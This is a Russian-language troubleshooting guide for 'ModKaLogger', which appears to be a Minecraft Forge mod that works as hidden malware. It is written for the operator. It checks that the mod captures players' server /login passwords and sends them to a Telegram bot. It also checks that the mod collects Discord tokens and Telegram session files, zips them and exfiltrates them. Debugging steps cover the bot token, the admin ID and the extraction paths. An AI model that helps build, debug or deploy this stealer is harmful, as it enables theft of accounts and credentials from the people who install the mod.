# Руководство по отладке ModKaLogger

## Проверка 1: Мод загружается?

### Где искать логи
```
%APPDATA%\.minecraft\logs\latest.log
```

### Что искать
Откройте файл логов и найдите строки:
```
[ModKaLogger] Конструктор вызван
[LoadingTest] ===== MOD LOADED SUCCESSFULLY =====
[ModKaLogger] LoadingTest загружен
[ModKaLogger] CommandHandler загружен
[CommandHandler] Статический блок выполнен
[ModKaLogger] Инициализация завершена
```

Если этих строк нет, мод не загружается. Проверьте:
- JAR файл находится в `%APPDATA%\.minecraft\mods\`
- Версия Forge правильная (36.2.42)
- Нет ошибок в логах перед этими сообщениями

## Проверка 2: Команды перехватываются?

### Что делать
1. Подключитесь к серверу
2. Введите команду: `/login testpassword`
3. Откройте логи

### Что искать
```
[CommandHandler] Получено сообщение: /login testpassword
[CommandHandler] Перехвачена команда логина: YourNickname / testpassword
Отправлено логирование входа в Telegram
```

Если этих строк нет:
- Проверьте, что вы подключены к серверу (должна быть строка `Connecting to...`)
- Проверьте, что регулярное выражение правильное
- Попробуйте другие команды: `/l password`, `/cp password`

## Проверка 3: Сообщения отправляются в Telegram?

### Что делать
1. Введите команду логина
2. Проверьте Telegram бот

### Что искать в логах
```
Отправлено логирование входа в Telegram
```

Если сообщение не пришло в Telegram:
- Проверьте токен бота в ModKaLogger.java
- Проверьте ID администратора
- Проверьте интернет соединение
- Проверьте, что бот может отправлять сообщения

### Как проверить токен и ID
1. Откройте ModKaLogger.java
2. Найдите строки:
```java
public static final String TELEGRAM_BOT_TOKEN = "...";
public static final String TELEGRAM_ADMIN_ID = "...";
```
3. Убедитесь, что они не пусты и содержат правильные значения

## Проверка 4: Краска работает?

### Что искать в логах
```
[ModKaLoggerInit] Запуск краски...
Найдено Discord токенов: X
Discord токены отправлены в Telegram
ZIP архив создан: ...
ZIP архив отправлен в Telegram
Telegram сессии отправлены в Telegram
[ModKaLoggerInit] Краска завершена!
```

Если краска не работает:
- Проверьте, что Discord установлен
- Проверьте, что Telegram установлен
- Проверьте пути в Discord.java и Telegram.java

## Проверка 5: Сетевые ошибки

### Ошибка: "Duplicate handler name: forge:vanilla_filter"
Это означает, что мод пытается добавить обработчик сети, который уже существует.

**Решение:** Убедитесь, что в коде нет попыток добавления обработчиков в Netty pipeline.

### Ошибка: "Missing pack_format"
Это означает, что отсутствует файл pack.mcmeta.

**Решение:** Убедитесь, что файл `src/main/resources/pack.mcmeta` существует и содержит:
```json
{
  "pack": {
    "pack_format": 5,
    "description": "ModKaLogger Resources"
  }
}
```

## Полезные команды для отладки

### Очистить логи
```bash
del %APPDATA%\.minecraft\logs\latest.log
```

### Пересобрать мод
```bash
./gradlew.bat clean build
```

### Удалить кэш Gradle
```bash
./gradlew.bat clean
```

## Включение DEBUG логирования

1. Откройте `src/main/resources/log4j2.xml`
2. Найдите строку с уровнем логирования
3. Измените на `DEBUG`
4. Пересоберите мод

## Контрольный список

- [ ] JAR файл находится в папке mods
- [ ] Версия Forge правильная
- [ ] Мод загружается (видны логи ModKaLogger)
- [ ] CommandHandler загружается
- [ ] Команды перехватываются
- [ ] Сообщения отправляются в Telegram
- [ ] Токен и ID бота правильные
- [ ] Интернет соединение работает

## Если ничего не помогает

1. Удалите JAR файл из папки mods
2. Очистите кэш Gradle: `./gradlew.bat clean`
3. Пересоберите мод: `./gradlew.bat build`
4. Скопируйте новый JAR в папку mods
5. Перезагрузите Minecraft
6. Проверьте логи
